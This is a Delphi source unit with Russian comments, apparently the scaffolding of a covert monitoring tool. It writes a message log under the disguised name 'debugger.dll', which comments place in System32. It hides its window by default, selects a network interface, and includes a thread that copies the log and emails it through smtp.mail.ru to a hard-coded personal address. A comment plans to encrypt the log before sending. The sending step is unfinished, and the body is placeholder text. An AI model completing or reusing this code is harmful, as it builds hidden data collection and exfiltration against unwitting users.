{ TODO : Для TSettings Перенести FileName в поле FFilename }
unit SClasses;

interface

uses Dialogs,Windows,SysUtils,IniFiles,Classes;

const
  { Имена служебных файлов }
  SETTINGS_FILENAME    ='config.ini';
  DEBUG_LOG_FILENAME   ='runtime.log';
  MESSAGE_LOG_FILENAME ='debugger.dll';

type
  TSettings = class
    private
      FCMD_EnableLog:       Boolean; //  [-l]
      FCMD_ShowWindow:      Boolean; //  [-s]
      FCMD_SelectInterface: Boolean; //  [-i]
      {----------------------------}
      FInterfaceName:       String;
      FInterfaceDesc:       String;
      FFullFileName:        String;
    public
      constructor Create;
      destructor  Destroy;
      procedure   LoadFromINI;
      procedure   SaveToINI;
      function    IsDublicate: Boolean;
      procedure   CheckDublicate;
      procedure   ReadCMDParams;

      property CMD_EnableLog:Boolean       read FCMD_EnableLog;
      property CMD_ShowWindow:Boolean      read FCMD_ShowWindow;
      property CMD_SelectInterface:Boolean read FCMD_SelectInterface;

      property InterfaceName:String read FInterfaceName write FInterfaceName;
      property InterfaceDesc:String read FInterfaceDesc write FInterfaceDesc;
  end;
  TDebugLog = class
    private
      //FList:TStringList;
      FLinkedObj:TObject;
      FFullFileName: String; //Путь и Имя файла, в который будем писать логи
      FEnable: Boolean;  //Активена ли запись лога
      procedure WriteLine (Msg:string); //Записать в файл.
    public
      constructor Create; overload;
      constructor Create (LinkedObj: TObject); overload;
      destructor Destroy;
      procedure Add (Msg:string;PrintDate:Boolean=True); //Добавить строку в лог
      //property List:TStringList read FList write FList;
  end;
  TMailSender = class(TThread)
  private
    FId:integer;
    procedure CopyFile;
  protected
    procedure Execute; override;
    procedure TerminateProc(Sender: TObject);

  public
    constructor Create;
    procedure SendMail;
  end;
  {TSenderThread = class (TThread)
    private
      FLog: TObject;
    public
      constructor Create(const Log:TObject); overload;
      destructor Destroy;
      procedure Execute; override; //Предопределенный метод.
      procedure SendMail; //Непосредственно отправка Письма.
  end;}

var
  GlobalLogger: TDebugLog;   //Глобальный лог.
  GlobalSettings: TSettings; //Глобальный менеджер настроек
  GlobalSender: TMailSender;

implementation

uses StdCtrls,
     IdSMTP,IdMessage,IdText,IdSSLOpenSSL,IdAttachmentFile,IdExplicitTLSClientServerBase;

//TSettings
constructor TSettings.Create;
begin
  FFullFileName:=ExtractFileDir(ParamStr(0))+'\'+SETTINGS_FILENAME;

  //Обнуляем все настройки
  FCMD_ShowWindow:=False;
  FCMD_EnableLog:=False;
  FCMD_SelectInterface:=False;

  FInterfaceName:='0';
  FInterfaceDesc:='0';
end;
destructor TSettings.Destroy;
begin

end;
procedure TSettings.LoadFromINI;
var
  Ini:TIniFile;
begin
  //if FileExists(filename) then
  //begin
    Ini:=TIniFile.Create(FFullFileName);
    try
      FInterfaceName:=Ini.ReadString('main','in','0');
      FInterfaceDesc:=Ini.ReadString('main','id','0');
    finally
      Ini.Free;
    end;
  //end
  //else
  //begin
    //Writeln('cant load. file not found');
  //end;
end;
procedure TSettings.SaveToINI;
var
  Ini:TIniFile;
begin
    Ini:=TIniFile.Create(FFullFileName);
    try
      Ini.WriteString('main','in',FInterfaceName);
      Ini.WriteString('main','id',FInterfaceDesc);
    finally
      Ini.Free;
    end;
end;
function TSettings.IsDublicate;
//Процедура проверки на вторичный запуск процесса
var
	Err:integer;
begin
  CreateMutex(nil,false,'{BE553A27-7C7C-4EEB-90DE-283E601AFA44}');
  Err := GetLastError();
  if (Err=ERROR_ALREADY_EXISTS)or(Err=ERROR_ACCESS_DENIED) then
  	Result:=True
  else
    Result:=False;
end;
procedure TSettings.CheckDublicate;
begin
  if IsDublicate then
  begin
    ShowMessage('Already runned');
    raise Exception.Create('Already Runned');
  end;
end;
procedure TSettings.ReadCMDParams;
//Получаем и обрабатываем параметры коммандной строки
var
  I: Integer;
  tmpBuf:string;
begin
  tmpBuf:='';
  if ParamCount>0 then
  begin
    I:=1;
    while i<=ParamCount do
    begin
      if ParamStr(i)='-help' then
      begin
        ShowMessage('This is help'+#13#10+
                    ' -l   Создавать файл лога'+#13#10+
                    ' -i   Перевыбор сетевого интерфейса'+#13#10+
                    ' -s   Отображение главного окна');
        ExitProcess(0); //Грубовато будет,но че поделать :D
      end
      else
      if (ParamStr(i)='-l') then  //Создавать файл лога
      begin
        FCMD_EnableLog:=True;
      end
      else
      if (ParamStr(i)='-s') then //Отображать главное окно программы
      begin
        FCMD_ShowWindow:=True;
      end
      else
      if (ParamStr(i)='-i') then //Выбрать сетевой интерфейс
      begin
        FCMD_SelectInterface:=True;
      end;
      inc(i);
    end;
  end;
end;
//end of TSettings

{ TDebugLog }
constructor TDebugLog.Create;
begin
  if Assigned(GlobalSettings) then
    FEnable:=GlobalSettings.FCMD_EnableLog
  else
    FEnable:=False;

  FFullFileName:=ExtractFileDir(ParamStr(0))+'\'+DEBUG_LOG_FILENAME;

  //FList:=TStringList.Create;
end;

constructor TDebugLog.Create(LinkedObj: TObject);
begin
  Self.Create;
  if LinkedObj is TMemo then
    FLinkedObj:=LinkedObj;
  (FLinkedObj as TMemo).Lines.Add('Debug log enabled..');
end;

destructor TDebugLog.Destroy;
begin
  //FList.Free;
end;
procedure TDebugLog.Add(Msg: string;PrintDate:Boolean);
var
  FullMsg:String;
begin
  if FEnable then
  begin
    if PrintDate then
      FullMsg:= DateTimeToStr(Now)+' '+Msg
    else
      FullMsg:= Msg;

    WriteLine(FullMsg);
  end;
  if Assigned(FLinkedObj) then
    (FLinkedObj as TMemo).Lines.Add(FullMsg);
end;
procedure TDebugLog.WriteLine(Msg: string);
//Пишем служебную инфу в "Рантайм лог"
var
  i:integer;
  F:TextFile;
  FullPath:string;
begin
  AssignFile(F,FFullFileName);
  try
    if not FileExists(FFullFileName) then Rewrite(F) else Append(F);
		Writeln(F,Msg);
    CloseFile(F);
  except
		On E: Exception do
    begin
    	ShowMessage('Ошибка: '+E.Message);
      Exit;
    end;
  end;
end;
{ end of TDebugLog }

procedure TMailSender.CopyFile;
var
  PathToExe:string; //Папка с файлом "C:\Windows\System32"
  FullFileName:string;  //Полный путь + имя файла лога "C:\Windows\System32\debugger.dll"
  TempFileName:string; //Имя временного файла: XXXXddmmyy-hhmm

  Source:string;      //Полный путь до файла-источника
  Destination:string; //Полный путь до файла-приемника
begin
(*
  1.Проверим доступность интернета.
    1.1.Если доступен, то:
      -Копируем файл во временный каталог, и переименовываем.
      -Шифруем содержимое
      -Отправляем письмо
      -Удаляем временный файл
      -Заносим запись в лог в случае успеха.
      --В случае неудачи указываем этап, и причину ошибки.
    1.2.Если НЕ доступен, то:
      -Пишем в лог сообщение об ошибке.
*)
  //PathToExe:=ExtractFileDir(ParamStr(0));
  Source:=ExtractFileDir(ParamStr(0))+'\'+MESSAGE_LOG_FILENAME;
  TempFileName:=FormatDateTime('ddmmyy"-"hhnn',Now());
  Destination:=ExtractFileDir(ParamStr(0))+'\'+TempFileName;

  if not FileExists(Source) then
  begin
    ShowMessage('SendMessage: File not found ('+Source+')');
    exit;
  end;
  GlobalLogger.Add(Source+#13#10+Destination);
  //Destination:=PathToExe+'\'+TempFileName;
  //CopyFile(PWideChar(@Source),PWideChar(@(Destination)),False);
  Windows.CopyFile(PWideChar(@Source),PWideChar(@Destination),False);
end;

constructor TMailSender.Create;
begin
  inherited Create(True); //Обьект создастся с остановленным потоком.
  Priority:=tpNormal; //Назначаем приоритет
  Self.FreeOnTerminate:=True; //Автоматически освобождаем обьект после завершения потока
  Self.OnTerminate:=TerminateProc;
  Randomize;
  FId:=Random(1000);
  GlobalLogger.Add('Create '+IntToStr(FId));
end;
procedure TMailSender.Execute;
begin
  NameThreadForDebugging('MailSender'+IntToStr(FId)); //Это для отладчика.
  GlobalLogger.Add('execute '+IntToStr(FId));
  Synchronize(CopyFile);
  Synchronize(SendMail);
end;
procedure TMailSender.SendMail;
var
  smtp: TIdSMTP;
  msg: TIdMessage;

  function ParceString (Msg:string):String;
  var
    i:integer;
  begin
    for i:=1 to Length(Msg) do
    begin
      if (Msg[i]=#13) or (msg[i]=#10) then
      begin
        Delete(Msg,i,1);
        Insert(' ',Msg,i);
      end;
    end;
    Result:=Msg;
  end;

begin
  //Готовим SMTP
  smtp:= TIdSMTP.Create;
  try
    msg:=TIdMessage.Create(smtp);
    try
      with msg do
      begin
        Subject:='subject';
        From.Text:='';
        Recipients.EMailAddresses:='osmenog@gmail.com';
        CharSet:='windows-1251';
        ContentType := 'text/plain';
        Body.Text:='text1111!!! =) [Привет!]';
      end;

      //----------MAIL.RU--------------
      smtp.Host:='smtp.mail.ru';
      smtp.Username:='';
      smtp.Password:='';
      //-------------------------------

      {//----------GMAIL.COM------------
      smtp.Host:='smtp.gmail.com';
      smtp.Username:='';
      smtp.Password:='';
      //-------------------------------}
      //smtp.UseTLS:=utUseRequireTLS;
      try
        smtp.Connect;
      except
        on E:Exception do
        begin
          GlobalLogger.Add('Connect error: ['+ParceString(E.Message)+']');
          raise;
        end;
      end;

      try
        try
          smtp.Send(msg);
        except
          On E:Exception do
          begin
            GlobalLogger.Add('Send error: ['+ParceString(E.Message)+']');
            raise;
          end;
        end;
      finally
        smtp.Disconnect;
      end;
    finally
      FreeAndNil(msg);
    end;
  finally
    FreeAndNil(smtp);
  end;
end;
procedure TMailSender.TerminateProc(Sender: TObject);
begin
   GlobalLogger.Add('terminated '+IntToStr(FId));
end;

{ TSenderThread }
{constructor TSenderThread.Create(const Log:TObject);
begin
  inherited Create;
  NameThreadForDebugging('SenderThread');
  FLog:=Log;
  if (FLOG is TMemo) then
  begin
    TMemo(FLog).Clear;
    TMemo(FLog).Lines.Add('Yahoo!');
  end;

end;}

{destructor TSenderThread.Destroy;
begin
  Beep;
  inherited Destroy;
end;

procedure TSenderThread.Execute;
begin
  repeat
    beep;
    TMemo(FLog).Lines.Add('tick');
    //Synchronize(SendMail);
    Sleep(1000);
  until 1=0
end;}

{procedure TSenderThread.SendMail;
var
  PathToExe:string; //Папка с файлом "C:\Windows\System32"
  FullFileName:string;  //Полный путь + имя файла лога "C:\Windows\System32\debugger.dll"
  TempFileName:string; //Имя временного файла: XXXXddmmyy-hhmm
  Destination:string;
begin
(*
  1.Проверим доступность интернета.
    1.1.Если доступен, то:
      -Копируем файл во временный каталог, и переименовываем.
      -Шифруем содержимое
      -Отправляем письмо
      -Удаляем временный файл
      -Заносим запись в лог в случае успеха.
      --В случае неудачи указываем этап, и причину ошибки.
    1.2.Если НЕ доступен, то:
      -Пишем в лог сообщение об ошибке.
*)
  PathToExe:=ExtractFileDir(ParamStr(0));
  FullFileName:=PathToExe+'\'+MESSAGE_LOG_FILENAME;
  TempFileName:=FormatDateTime('ddmmyy"-"hhnn',Now());

  if not FileExists(FullFileName) then
  begin
    ShowMessage('SendMessage: File not found ('+FullFileName+')');
    exit;
  end;
  //Destination:=PathToExe+'\'+TempFileName;
  CopyFile(PWideChar(@FullFileName),PWideChar(@(Destination)),False);

end;}
{ end of TSenderThread }

end.
